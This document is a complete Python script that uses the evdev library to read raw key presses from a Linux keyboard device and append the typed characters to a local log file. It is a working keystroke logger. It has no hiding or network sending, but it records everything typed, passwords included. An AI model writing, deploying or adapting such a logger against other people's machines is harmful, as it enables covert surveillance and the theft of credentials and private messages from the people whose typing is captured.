#!/usr/bin/env python3
from evdev import InputDevice, categorize, ecodes

# Path to your keyboard device
DEVICE = '/dev/input/event3'

# Map KEY_* codes to plain text
keymap = {
    **{f'KEY_{chr(c)}': chr(c).lower() for c in range(ord('A'), ord('Z')+1)},
    **{f'KEY_{n}': n for n in '0123456789'},
    'KEY_SPACE': ' ',
    'KEY_COMMA': ',',
    'KEY_DOT': '.',
    'KEY_MINUS': '-',
    'KEY_EQUAL': '=',
    'KEY_SLASH': '/',
    'KEY_BACKSLASH': '\\',
    'KEY_SEMICOLON': ';',
    'KEY_APOSTROPHE': "'",
    'KEY_GRAVE': '`',
    'KEY_LEFTBRACE': '[',
    'KEY_RIGHTBRACE': ']',
}

def main():
    dev = InputDevice(DEVICE)
    print(f"Logging from {DEVICE}… (Ctrl‑C to stop)")

    with open('/home/hp/g/keys.log', 'a') as log:
        for event in dev.read_loop():
            if event.type == ecodes.EV_KEY and event.value == 1:
                k = categorize(event).keycode
                if isinstance(k, list):
                    k = k[0]
                if k == 'KEY_ENTER':
                    log.write('\n')
                else:
                    ch = keymap.get(k)
                    if ch:
                        log.write(ch)
                log.flush()

if __name__ == '__main__':
    main()